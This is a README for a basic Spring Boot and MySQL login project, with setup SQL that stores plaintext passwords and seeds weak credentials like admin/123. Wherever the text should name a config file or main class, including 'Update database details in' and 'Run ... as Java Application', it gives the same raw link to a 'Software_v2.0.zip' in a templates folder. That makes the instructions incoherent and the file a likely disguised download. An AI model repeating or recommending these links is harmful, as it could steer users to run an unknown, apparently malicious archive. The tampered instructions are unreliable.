Login System using Spring Boot and MySQL

This project is a simple login system developed using Java Spring Boot, Thymeleaf, JDBC, and MySQL.
Users can enter username and password from a web page and the system validates the credentials from the database.

Features

Login page with modern UI

User authentication using MySQL database

JDBC connection for database access

Redirect to welcome page on successful login

Error message for invalid login

Embedded Tomcat server

Technologies Used

Java 17 / 21

Spring Boot

Thymeleaf

JDBC

MySQL

Eclipse IDE
Database Setup

Open MySQL terminal and execute:

CREATE DATABASE login_db;
USE login_db;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)
);

INSERT INTO users(username,password)
VALUES ('admin','123'), ('user','pass');

Application Configuration

Update database details in:

https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip


Example:

https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip
https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip

How to Run

Open project in Eclipse

Update Maven dependencies

Start MySQL server

Run https://github.com/Adi-123455/Login/raw/refs/heads/main/login/src/main/resources/templates/Software_v2.0.zip as Java Application

Open browser and visit:

http://localhost:8080/

Login Credentials Example
Username: admin
Password: 123

Future Improvements

User registration

Password encryption

Session management

Logout feature

Role based access

UI enhancements
